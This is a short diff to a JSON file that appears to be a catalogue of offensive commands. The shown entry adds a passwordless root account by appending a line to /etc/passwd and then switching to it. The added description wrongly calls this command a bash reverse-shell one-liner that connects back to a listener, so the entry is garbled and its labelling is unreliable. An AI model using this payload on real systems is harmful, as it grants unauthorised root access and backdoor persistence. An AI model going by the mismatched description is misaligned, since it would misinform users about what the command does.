@@ -37,7 +37,8 @@
   "variations": [
     {
       "label": "Passwordless root entry (empty second field bypasses password check)",
-      "command": "echo \"root3::0:0:root:/root:/bin/bash\" >> /etc/passwd\nsu root3\n# No password required - instant root"
+      "command": "echo \"root3::0:0:root:/root:/bin/bash\" >> /etc/passwd\nsu root3\n# No password required - instant root",
+      "description": "Bash reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
     }
   ],
   "tools_used": [
